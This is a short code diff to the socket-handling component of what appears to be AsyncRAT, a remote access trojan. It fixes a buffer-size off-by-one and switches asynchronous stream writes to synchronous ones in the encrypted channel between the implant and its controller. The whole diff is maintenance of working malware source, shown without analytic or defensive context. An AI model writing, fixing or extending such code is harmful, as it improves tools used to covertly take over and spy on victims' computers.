@@ -64,7 +64,7 @@ namespace AsyncRAT_Sharp.Sockets
                                 MS = new MemoryStream();
                                 if (Buffersize > 0)
                                 {
-                                    Buffer = new byte[Buffersize - 1];
+                                    Buffer = new byte[Buffersize];
                                     BufferRecevied = true;
                                 }
                             }
@@ -80,7 +80,6 @@ namespace AsyncRAT_Sharp.Sockets
                                     try
                                     {
                                         HandlePacket.Read(this, Settings.aes256.Decrypt(MS.ToArray()));
-
                                     }
                                     catch (CryptographicException)
                                     {
@@ -153,8 +152,8 @@ namespace AsyncRAT_Sharp.Sockets
                     {
                         byte[] buffer = Settings.aes256.Encrypt((byte[])Msgs);
                         byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
-                        MEM.WriteAsync(buffersize, 0, buffersize.Length);
-                        MEM.WriteAsync(buffer, 0, buffer.Length);
+                        MEM.Write(buffersize, 0, buffersize.Length);
+                        MEM.Write(buffer, 0, buffer.Length);
                         Client.Poll(-1, SelectMode.SelectWrite);
                         Client.BeginSend(MEM.ToArray(), 0, (int)MEM.Length, SocketFlags.None, EndSend, null);
                         Settings.Sent += (long)MEM.Length;
